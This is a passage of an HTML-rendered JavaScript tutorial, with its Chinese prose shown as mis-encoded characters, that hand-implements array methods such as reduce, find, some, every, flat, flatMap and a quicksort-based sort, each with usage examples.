    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">"this is null or not defined"</span>);
  }

  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> callback !== <span class="hljs-string">"function"</span>) {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(callback + <span class="hljs-string">" is not a function"</span>);
  }

  <span class="hljs-keyword">const</span> obj = <span class="hljs-title class_">Object</span>(<span class="hljs-variable language_">this</span>);
  <span class="hljs-keyword">const</span> len = obj.<span class="hljs-property">length</span> &gt;&gt;&gt; <span class="hljs-number">0</span>;

  <span class="hljs-comment">// å¤„ç†ç©ºæ•°ç»„ä¸”æ— åˆå§‹å€¼çš„æƒ…å†µ</span>
  <span class="hljs-keyword">if</span> (len === <span class="hljs-number">0</span> &amp;&amp; initialValue === <span class="hljs-literal">undefined</span>) {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">"Reduce of empty array with no initial value"</span>);
  }

  <span class="hljs-keyword">let</span> accumulator = initialValue;
  <span class="hljs-keyword">let</span> startIndex = <span class="hljs-number">0</span>;

  <span class="hljs-comment">// å¦‚æœæ²¡æœ‰æä¾›åˆå§‹å€¼ï¼Œä½¿ç”¨ç¬¬ä¸€ä¸ªæœ‰æ•ˆå…ƒç´ ä½œä¸ºåˆå§‹å€¼</span>
  <span class="hljs-keyword">if</span> (initialValue === <span class="hljs-literal">undefined</span>) {
    <span class="hljs-comment">// æ‰¾åˆ°ç¬¬ä¸€ä¸ªå­˜åœ¨çš„å…ƒç´ (å¤„ç†ç¨€ç–æ•°ç»„)</span>
    <span class="hljs-keyword">while</span> (startIndex &lt; len &amp;&amp; !(startIndex <span class="hljs-keyword">in</span> obj)) {
      startIndex++;
    }

    <span class="hljs-keyword">if</span> (startIndex === len) {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">"Reduce of empty array with no initial value"</span>);
    }

    accumulator = obj[startIndex];
    startIndex++;
  }

  <span class="hljs-comment">// æ‰§è¡Œreduceæ“ä½œ</span>
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = startIndex; i &lt; len; i++) {
    <span class="hljs-keyword">if</span> (i <span class="hljs-keyword">in</span> obj) {
      accumulator = <span class="hljs-title function_">callback</span>(accumulator, obj[i], i, obj);
    }
  }

  <span class="hljs-keyword">return</span> accumulator;
};

<span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹</span>
<span class="hljs-keyword">const</span> sum = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>].<span class="hljs-title function_">myReduce</span>(<span class="hljs-function">(<span class="hljs-params">acc, curr</span>) =&gt;</span> acc + curr, <span class="hljs-number">0</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(sum); <span class="hljs-comment">// 15</span>

<span class="hljs-comment">// å¤æ‚ç¤ºä¾‹ï¼šæ•°ç»„è½¬å¯¹è±¡</span>
<span class="hljs-keyword">const</span> items = [
  { <span class="hljs-attr">id</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">"Apple"</span> },
  { <span class="hljs-attr">id</span>: <span class="hljs-number">2</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">"Banana"</span> },
  { <span class="hljs-attr">id</span>: <span class="hljs-number">3</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">"Orange"</span> },
];

<span class="hljs-keyword">const</span> itemMap = items.<span class="hljs-title function_">myReduce</span>(<span class="hljs-function">(<span class="hljs-params">acc, item</span>) =&gt;</span> {
  acc[item.<span class="hljs-property">id</span>] = item;
  <span class="hljs-keyword">return</span> acc;
}, {});

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(itemMap);
<span class="hljs-comment">// {</span>
<span class="hljs-comment">//   '1': { id: 1, name: 'Apple' },</span>
<span class="hljs-comment">//   '2': { id: 2, name: 'Banana' },</span>
<span class="hljs-comment">//   '3': { id: 3, name: 'Orange' }</span>
<span class="hljs-comment">// }</span>
</code></pre>
<h4 data-id="heading-5">äºŒã€æœç´¢ä¸æ–­è¨€æ–¹æ³•</h4>
<h5 data-id="heading-6">2.1 findæ–¹æ³•å®ç°</h5>
<p><code>find</code>æ–¹æ³•è¿”å›æ•°ç»„ä¸­æ»¡è¶³æµ‹è¯•å‡½æ•°çš„ç¬¬ä¸€ä¸ªå…ƒç´ çš„å€¼ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">myFind</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">callback, thisArg</span>) {
  <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span> === <span class="hljs-literal">null</span>) {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">"this is null or not defined"</span>);
  }

  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> callback !== <span class="hljs-string">"function"</span>) {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(callback + <span class="hljs-string">" is not a function"</span>);
  }

  <span class="hljs-keyword">const</span> obj = <span class="hljs-title class_">Object</span>(<span class="hljs-variable language_">this</span>);
  <span class="hljs-keyword">const</span> len = obj.<span class="hljs-property">length</span> &gt;&gt;&gt; <span class="hljs-number">0</span>;

  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) {
    <span class="hljs-keyword">if</span> (i <span class="hljs-keyword">in</span> obj) {
      <span class="hljs-keyword">if</span> (callback.<span class="hljs-title function_">call</span>(thisArg, obj[i], i, obj)) {
        <span class="hljs-keyword">return</span> obj[i];
      }
    }
  }

  <span class="hljs-keyword">return</span> <span class="hljs-literal">undefined</span>;
};

<span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹</span>
<span class="hljs-keyword">const</span> users = [
  { <span class="hljs-attr">id</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">"Alice"</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">25</span> },
  { <span class="hljs-attr">id</span>: <span class="hljs-number">2</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">"Bob"</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">30</span> },
  { <span class="hljs-attr">id</span>: <span class="hljs-number">3</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">"Charlie"</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">35</span> },
];

<span class="hljs-keyword">const</span> user = users.<span class="hljs-title function_">myFind</span>(<span class="hljs-function">(<span class="hljs-params">user</span>) =&gt;</span> user.<span class="hljs-property">age</span> &gt; <span class="hljs-number">28</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(user); <span class="hljs-comment">// { id: 2, name: 'Bob', age: 30 }</span>
</code></pre>
<h5 data-id="heading-7">2.2 findIndexæ–¹æ³•å®ç°</h5>
<p><code>findIndex</code>æ–¹æ³•è¿”å›æ•°ç»„ä¸­æ»¡è¶³æµ‹è¯•å‡½æ•°çš„ç¬¬ä¸€ä¸ªå…ƒç´ çš„ç´¢å¼•ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">myFindIndex</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">callback, thisArg</span>) {
  <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span> === <span class="hljs-literal">null</span>) {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">"this is null or not defined"</span>);
  }

  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> callback !== <span class="hljs-string">"function"</span>) {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(callback + <span class="hljs-string">" is not a function"</span>);
  }

  <span class="hljs-keyword">const</span> obj = <span class="hljs-title class_">Object</span>(<span class="hljs-variable language_">this</span>);
  <span class="hljs-keyword">const</span> len = obj.<span class="hljs-property">length</span> &gt;&gt;&gt; <span class="hljs-number">0</span>;

  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) {
    <span class="hljs-keyword">if</span> (i <span class="hljs-keyword">in</span> obj) {
      <span class="hljs-keyword">if</span> (callback.<span class="hljs-title function_">call</span>(thisArg, obj[i], i, obj)) {
        <span class="hljs-keyword">return</span> i;
      }
    }
  }

  <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;
};

<span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹</span>
<span class="hljs-keyword">const</span> numbers = [<span class="hljs-number">5</span>, <span class="hljs-number">12</span>, <span class="hljs-number">8</span>, <span class="hljs-number">130</span>, <span class="hljs-number">44</span>];
<span class="hljs-keyword">const</span> firstLargeNumberIndex = numbers.<span class="hljs-title function_">myFindIndex</span>(<span class="hljs-function"><span class="hljs-params">num</span> =&gt;</span> num &gt; <span class="hljs-number">10</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(firstLargeNumberIndex); <span class="hljs-comment">// 1</span>
</code></pre>
<h5 data-id="heading-8">2.3 someæ–¹æ³•å®ç°</h5>
<p><code>some</code>æ–¹æ³•è¿”å›æ•°ç»„ä¸­æ˜¯å¦è‡³å°‘æœ‰ä¸€ä¸ªå…ƒç´ é€šè¿‡äº†æµ‹è¯•ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">mySome</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">callback, thisArg</span>) {
  <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span> === <span class="hljs-literal">null</span>) {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">"this is null or not defined"</span>);
  }

  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> callback !== <span class="hljs-string">"function"</span>) {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(callback + <span class="hljs-string">" is not a function"</span>);
  }

  <span class="hljs-keyword">const</span> obj = <span class="hljs-title class_">Object</span>(<span class="hljs-variable language_">this</span>);
  <span class="hljs-keyword">const</span> len = obj.<span class="hljs-property">length</span> &gt;&gt;&gt; <span class="hljs-number">0</span>;

  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) {
    <span class="hljs-keyword">if</span> (i <span class="hljs-keyword">in</span> obj) {
      <span class="hljs-keyword">if</span> (callback.<span class="hljs-title function_">call</span>(thisArg, obj[i], i, obj)) {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
      }
    }
  }

  <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
};

<span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹</span>
<span class="hljs-keyword">const</span> hasEven = [<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>].<span class="hljs-title function_">mySome</span>(<span class="hljs-function">(<span class="hljs-params">num</span>) =&gt;</span> num % <span class="hljs-number">2</span> === <span class="hljs-number">0</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(hasEven); <span class="hljs-comment">// true</span>
</code></pre>
<h5 data-id="heading-9">2.4 everyæ–¹æ³•å®ç°</h5>
<p><code>every</code>æ–¹æ³•æµ‹è¯•æ•°ç»„ä¸­çš„æ‰€æœ‰å…ƒç´ æ˜¯å¦éƒ½é€šè¿‡äº†æµ‹è¯•ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">myEvery</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">callback, thisArg</span>) {
  <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span> === <span class="hljs-literal">null</span>) {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">"this is null or not defined"</span>);
  }

  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> callback !== <span class="hljs-string">"function"</span>) {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(callback + <span class="hljs-string">" is not a function"</span>);
  }

  <span class="hljs-keyword">const</span> obj = <span class="hljs-title class_">Object</span>(<span class="hljs-variable language_">this</span>);
  <span class="hljs-keyword">const</span> len = obj.<span class="hljs-property">length</span> &gt;&gt;&gt; <span class="hljs-number">0</span>;

  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) {
    <span class="hljs-keyword">if</span> (i <span class="hljs-keyword">in</span> obj) {
      <span class="hljs-keyword">if</span> (!callback.<span class="hljs-title function_">call</span>(thisArg, obj[i], i, obj)) {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
      }
    }
  }

  <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
};

<span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹</span>
<span class="hljs-keyword">const</span> allPositive = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>].<span class="hljs-title function_">myEvery</span>(<span class="hljs-function">(<span class="hljs-params">num</span>) =&gt;</span> num &gt; <span class="hljs-number">0</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(allPositive); <span class="hljs-comment">// true</span>
</code></pre>
<h4 data-id="heading-10">ä¸‰ã€æ•°ç»„æ‰å¹³åŒ–æ–¹æ³•</h4>
<h5 data-id="heading-11">3.1 flatæ–¹æ³•å®ç°</h5>
<p><code>flat</code>æ–¹æ³•åˆ›å»ºä¸€ä¸ªæ–°æ•°ç»„, å…¶ä¸­æ‰€æœ‰å­æ•°ç»„å…ƒç´ é€’å½’è¿æ¥åˆ°æŒ‡å®šæ·±åº¦ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">myFlat</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">depth = <span class="hljs-number">1</span></span>) {
  <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span> === <span class="hljs-literal">null</span>) {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">"this is null or not defined"</span>);
  }

  <span class="hljs-comment">// æ·±åº¦å‚æ•°éªŒè¯</span>
  <span class="hljs-keyword">if</span> (depth &lt; <span class="hljs-number">0</span>) {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RangeError</span>(<span class="hljs-string">"depth must be a non-negative integer"</span>);
  }

  <span class="hljs-keyword">const</span> result = [];

  <span class="hljs-keyword">const</span> <span class="hljs-title function_">flatten</span> = (<span class="hljs-params">arr, currentDepth</span>) =&gt; {
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; arr.<span class="hljs-property">length</span>; i++) {
      <span class="hljs-keyword">const</span> element = arr[i];
      <span class="hljs-comment">// å¦‚æœå½“å‰æ·±åº¦å°äºæŒ‡å®šæ·±åº¦ä¸”å…ƒç´ æ˜¯æ•°ç»„, åˆ™é€’å½’æ‰å¹³åŒ–</span>
      <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(element) &amp;&amp; currentDepth &lt; depth) {
        <span class="hljs-title function_">flatten</span>(element, currentDepth + <span class="hljs-number">1</span>);
      } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// å¦åˆ™ç›´æ¥æ·»åŠ åˆ°ç»“æœæ•°ç»„</span>
        <span class="hljs-comment">// æ³¨æ„: å¦‚æœdepthä¸º0ï¼Œåˆ™ä¸ä¼šæ‰å¹³åŒ–ä»»ä½•æ•°ç»„</span>
        result.<span class="hljs-title function_">push</span>(element);
      }
    }
  };

  <span class="hljs-title function_">flatten</span>(<span class="hljs-variable language_">this</span>, <span class="hljs-number">0</span>);
  <span class="hljs-keyword">return</span> result;
};

<span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹</span>
<span class="hljs-keyword">const</span> nestedArray = [<span class="hljs-number">1</span>, [<span class="hljs-number">2</span>, [<span class="hljs-number">3</span>, [<span class="hljs-number">4</span>]], <span class="hljs-number">5</span>]];
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(nestedArray.<span class="hljs-title function_">myFlat</span>()); <span class="hljs-comment">// [1, 2, [3, [4]], 5]</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(nestedArray.<span class="hljs-title function_">myFlat</span>(<span class="hljs-number">2</span>)); <span class="hljs-comment">// [1, 2, 3, [4], 5]</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(nestedArray.<span class="hljs-title function_">myFlat</span>(<span class="hljs-title class_">Infinity</span>)); <span class="hljs-comment">// [1, 2, 3, 4, 5]</span>
</code></pre>
<h5 data-id="heading-12">3.2 flatMapæ–¹æ³•å®ç°</h5>
<p><code>flatMap</code>æ–¹æ³•é¦–å…ˆä½¿ç”¨æ˜ å°„å‡½æ•°æ˜ å°„æ¯ä¸ªå…ƒç´ , ç„¶åå°†ç»“æœå‹ç¼©æˆä¸€ä¸ªæ–°æ•°ç»„ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">myFlatMap</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">callback, thisArg</span>) {
  <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span> === <span class="hljs-literal">null</span>) {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">"this is null or not defined"</span>);
  }

  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> callback !== <span class="hljs-string">"function"</span>) {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(callback + <span class="hljs-string">" is not a function"</span>);
  }

  <span class="hljs-keyword">const</span> obj = <span class="hljs-title class_">Object</span>(<span class="hljs-variable language_">this</span>);
  <span class="hljs-keyword">const</span> len = obj.<span class="hljs-property">length</span> &gt;&gt;&gt; <span class="hljs-number">0</span>;
  <span class="hljs-keyword">const</span> result = [];

  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) {
    <span class="hljs-keyword">if</span> (i <span class="hljs-keyword">in</span> obj) {
      <span class="hljs-keyword">const</span> mapped = callback.<span class="hljs-title function_">call</span>(thisArg, obj[i], i, obj);

      <span class="hljs-comment">// å¦‚æœå›è°ƒå‡½æ•°è¿”å›çš„æ˜¯æ•°ç»„, åˆ™å±•å¼€å®ƒ</span>
      <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(mapped)) {
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> j = <span class="hljs-number">0</span>; j &lt; mapped.<span class="hljs-property">length</span>; j++) {
          result.<span class="hljs-title function_">push</span>(mapped[j]);
        }
      } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// å¦‚æœä¸æ˜¯æ•°ç»„ï¼Œç›´æ¥æ·»åŠ </span>
        result.<span class="hljs-title function_">push</span>(mapped);
      }
    }
  }

  <span class="hljs-keyword">return</span> result;
};

<span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹</span>
<span class="hljs-keyword">const</span> phrases = [<span class="hljs-string">"Hello world"</span>, <span class="hljs-string">"JavaScript is awesome"</span>];
<span class="hljs-keyword">const</span> words = phrases.<span class="hljs-title function_">myFlatMap</span>(<span class="hljs-function">(<span class="hljs-params">phrase</span>) =&gt;</span> phrase.<span class="hljs-title function_">split</span>(<span class="hljs-string">" "</span>));
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(words); <span class="hljs-comment">// ["Hello", "world", "JavaScript", "is", "awesome"]</span>

<span class="hljs-comment">// å¦ä¸€ä¸ªç¤ºä¾‹ï¼šå±•å¼€å¹¶è¿‡æ»¤</span>
<span class="hljs-keyword">const</span> numbers2 = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>];
<span class="hljs-keyword">const</span> result = numbers2.<span class="hljs-title function_">myFlatMap</span>(<span class="hljs-function">(<span class="hljs-params">x</span>) =&gt;</span> (x % <span class="hljs-number">2</span> === <span class="hljs-number">0</span> ? [x, x * <span class="hljs-number">2</span>] : []));
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(result); <span class="hljs-comment">// [2, 4, 4, 8]</span>
</code></pre>
<h4 data-id="heading-13">å››ã€æ’åºç®—æ³•å®ç°</h4>
<h5 data-id="heading-14">4.1 sortæ–¹æ³•å®ç°</h5>
<p>JavaScriptåŸç”Ÿçš„<code>sort</code>æ–¹æ³•ä½¿ç”¨TimSortç®—æ³•(ä¸€ç§æ··åˆæ’åºç®—æ³•, ç»“åˆäº†å½’å¹¶æ’åºå’Œæ’å…¥æ’åº)ã€‚è¿™é‡Œæˆ‘ä»¬å®ç°ä¸€ä¸ªç®€å•ä½†åŠŸèƒ½å®Œæ•´çš„æ’åºæ–¹æ³•, æ”¯æŒè‡ªå®šä¹‰æ¯”è¾ƒå‡½æ•°ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">mySort</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">compartFn</span>) {
  <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span> === <span class="hljs-literal">null</span>) {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">"this is null or not defined"</span>);
  }

  <span class="hljs-keyword">const</span> obj = <span class="hljs-title class_">Object</span>(<span class="hljs-variable language_">this</span>);
  <span class="hljs-keyword">const</span> len = obj.<span class="hljs-property">length</span> &gt;&gt;&gt; <span class="hljs-number">0</span>;

  <span class="hljs-comment">// å¦‚æœæ²¡æœ‰æä¾›æ¯”è¾ƒå‡½æ•°, ä½¿ç”¨é»˜è®¤çš„å­—ç¬¦ä¸²æ¯”è¾ƒ</span>
  <span class="hljs-keyword">if</span> (compartFn === <span class="hljs-literal">undefined</span>) {
    <span class="hljs-comment">// é»˜è®¤æ¯”è¾ƒå‡½æ•°: å°†å…ƒç´ è½¬ä¸ºå­—ç¬¦ä¸², ç„¶åæ¯”è¾ƒUTF-16ä»£ç å•å…ƒå€¼åºåˆ—</span>
    compartFn = <span class="hljs-keyword">function</span> (<span class="hljs-params">a, b</span>) {
      <span class="hljs-keyword">const</span> aString = <span class="hljs-title class_">String</span>(a);
      <span class="hljs-keyword">const</span> bString = <span class="hljs-title class_">String</span>(b);

      <span class="hljs-keyword">if</span> (aString &lt; bString) <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;
      <span class="hljs-keyword">if</span> (aString &gt; bString) <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
    };
  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> compartFn !== <span class="hljs-string">"function"</span>) {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">"compareFn must be a function or undefined"</span>);
  }

  <span class="hljs-comment">// å®ç°å¿«é€Ÿæ’åºç®—æ³•(é«˜æ•ˆä¸”å¸¸ç”¨)</span>
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">quickSort</span>(<span class="hljs-params">arr, left, right, compare</span>) {
    <span class="hljs-keyword">if</span> (left &gt;= right) <span class="hljs-keyword">return</span>;

    <span class="hljs-keyword">const</span> pivotIndex = <span class="hljs-title function_">partition</span>(arr, left, right, compare);
    <span class="hljs-title function_">quickSort</span>(arr, left, pivotIndex - <span class="hljs-number">1</span>, compare);
    <span class="hljs-title function_">quickSort</span>(arr, pivotIndex + <span class="hljs-number">1</span>, right, compare);
  }

  <span class="hljs-keyword">function</span> <span class="hljs-title function_">partition</span>(<span class="hljs-params">arr, left, right, compare</span>) {
    <span class="hljs-comment">// é€‰æ‹©ä¸­é—´å…ƒç´ ä½œä¸ºåŸºå‡†å€¼</span>
    <span class="hljs-keyword">const</span> pivotIndex = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>((left + right) / <span class="hljs-number">2</span>);
    <span class="hljs-keyword">const</span> pivotValue = arr[pivotIndex];

    <span class="hljs-comment">// å°†åŸºå‡†å€¼ç§»åˆ°æœ€å³è¾¹</span>
    [arr[pivotIndex], arr[right]] = [arr[right], arr[pivotIndex]];

    <span class="hljs-keyword">let</span> storeIndex = left;

    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = left; i &lt; right; i++) {
      <span class="hljs-comment">// ä½¿ç”¨æ¯”è¾ƒå‡½æ•°æ¯”è¾ƒå½“å‰å…ƒç´ å’ŒåŸºå‡†å€¼</span>
      <span class="hljs-keyword">if</span> (<span class="hljs-title function_">compare</span>(arr[i], pivotValue) &lt; <span class="hljs-number">0</span>) {
        [arr[storeIndex], arr[i]] = [arr[i], arr[storeIndex]];
        storeIndex++;
      }
    }

    <span class="hljs-comment">// å°†åŸºå‡†å€¼æ”¾åˆ°æ­£ç¡®çš„ä½ç½®</span>
    [arr[storeIndex], arr[right]] = [arr[right], arr[storeIndex]];
    <span class="hljs-keyword">return</span> storeIndex;
  }

  <span class="hljs-comment">// å°†ç¨€ç–æ•°ç»„è½¬æ¢ä¸ºç´§å‡‘æ•°ç»„(è·³è¿‡ä¸å­˜åœ¨çš„å…ƒç´ )</span>
  <span class="hljs-keyword">const</span> compactArray = [];
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) {
    <span class="hljs-keyword">if</span> (i <span class="hljs-keyword">in</span> obj) {
      compactArray.<span class="hljs-title function_">push</span>(obj[i]);
    }
  }

  <span class="hljs-comment">// æ‰§è¡Œå¿«é€Ÿæ’åº</span>
  <span class="hljs-keyword">if</span> (compactArray.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) {
    <span class="hljs-title function_">quickSort</span>(compactArray, <span class="hljs-number">0</span>, compactArray.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>, compartFn);
  }

  <span class="hljs-comment">// å°†æ’åºåçš„æ•°ç»„å¤åˆ¶å›åŸæ•°ç»„ï¼Œä¿æŒç¨€ç–æ€§</span>
  <span class="hljs-keyword">let</span> compactIndex = <span class="hljs-number">0</span>;
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) {
    <span class="hljs-keyword">if</span> (i <span class="hljs-keyword">in</span> obj) {
      obj[i] = compactArray[compactIndex++];
    }
  }

  <span class="hljs-keyword">return</span> obj;
};

<span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹</span>
<span class="hljs-keyword">const</span> unsorted = [<span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">9</span>, <span class="hljs-number">2</span>, <span class="hljs-number">6</span>, <span class="hljs-number">5</span>];
unsorted.<span class="hljs-title function_">mySort</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(unsorted); <span class="hljs-comment">// [1, 1, 2, 3, 4, 5, 5, 6, 9]</span>

<span class="hljs-comment">// ä½¿ç”¨è‡ªå®šä¹‰æ¯”è¾ƒå‡½æ•°</span>
<span class="hljs-keyword">const</span> students = [
  { <span class="hljs-attr">name</span>: <span class="hljs-string">"Alice"</span>, <span class="hljs-attr">score</span>: <span class="hljs-number">85</span> },
  { <span class="hljs-attr">name</span>: <span class="hljs-string">"Bob"</span>, <span class="hljs-attr">score</span>: <span class="hljs-number">92</span> },
  { <span class="hljs-attr">name</span>: <span class="hljs-string">"Charlie"</span>, <span class="hljs-attr">score</span>: <span class="hljs-number">78</span> },
];

students.<span class="hljs-title function_">mySort</span>(<span class="hljs-function">(<span class="hljs-params">a, b</span>) =&gt;</span> b.<span class="hljs-property">score</span> - a.<span class="hljs-property">score</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(students);
